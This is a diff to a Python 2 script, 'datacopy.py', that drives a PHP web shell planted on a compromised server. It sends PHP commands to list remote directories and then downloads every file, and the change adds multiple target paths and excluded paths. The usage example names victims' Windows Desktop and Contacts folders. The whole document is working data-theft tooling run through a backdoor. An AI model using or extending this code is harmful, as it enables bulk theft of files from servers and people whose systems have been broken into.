@@ -62,17 +62,17 @@ def is_dir(path, url, pwd):#判断远程路径是文件夹还是目录
     else:
         return False
         
-def walk(root, path, url, pwd):#遍历目录
+def walk(root, path, url, pwd, no_paths):#遍历目录
     res = requests.post(url, data = {pwd:'print_r(scandir("%s"));' % (root + '/' + path)}).content
     list = re.findall(' => (.*)', res)
     if len(list) > 2:
         for target in list:
             if target != '.' and target != '..':
                 path_tmp = path + '/' + target
-                if is_dir(root+'/'+path_tmp, url, pwd):
+                if is_dir(root+'/'+path_tmp, url, pwd) and root+'/'+path_tmp not in no_paths:
                     create(path_tmp, dict=True)
-                    walk(root, path_tmp, url,  pwd)
-                else:
+                    walk(root, path_tmp, url,  pwd, no_paths)
+                elif root+'/'+path_tmp not in no_paths:
                     content = get_content(root+'/'+path_tmp, url, pwd)
                     create(path=path_tmp, content=content)
         return
@@ -81,18 +81,28 @@ if __name__ == '__main__':
     if len(sys.argv) == 4:
         url = sys.argv[1]
         pwd = sys.argv[2]
-        path = sys.argv[3]
+        paths = sys.argv[3]
     elif len(sys.argv) == 3:
         url = sys.argv[1]
         pwd = sys.argv[2]
-        path = requests.post(url, data = {pwd: "echo $_SERVER[\"DOCUMENT_ROOT\"];"}).content
+        paths = requests.post(url, data = {pwd: "echo $_SERVER[\"DOCUMENT_ROOT\"];"}).content
     else:
         print "wrong args:"
-        print "example:"
-        print '     datacopy.py    http://www.exmaple.com/1.php    password     webpath(the web path you want to down, null means path of site)'
+        print "usage:"
+        print '     datacopy.py   shell_url   password     webpath(the web path you want to down, null means path of site, split with ",", if there is a directory you do not want to download, use "~", such as "~C:/windows")'
+        print 'example:'
+        print 'datacopy.py    http://www.exmaple.com/1.php    password     "C:/users/range/desktop,C:/users/range/desktop,C:/User/srange/Contacts,~C:/Users/range/desktop/datacopy'
         exit()
-    path = sub_path(path)
-    root = path.strip(get_directory(path)).rstrip('/')
-    path = get_directory(path)
-    create(path, dict=True)
-    walk(root, path, url, pwd)
+    no_paths = []
+    paths = re.sub(' ', '', paths).split(',')
+    for path in paths:
+        if path[0] == '~':
+            no_paths.append(sub_path(path[1:]))
+            paths.pop(paths.index(path))
+    for path in paths:
+        path = sub_path(path)
+        root = path.strip(get_directory(path)).rstrip('/')
+        path = get_directory(path)
+        if root+'/'+path not in no_paths:
+            create(path, dict=True)
+            walk(root, path, url, pwd, no_paths)
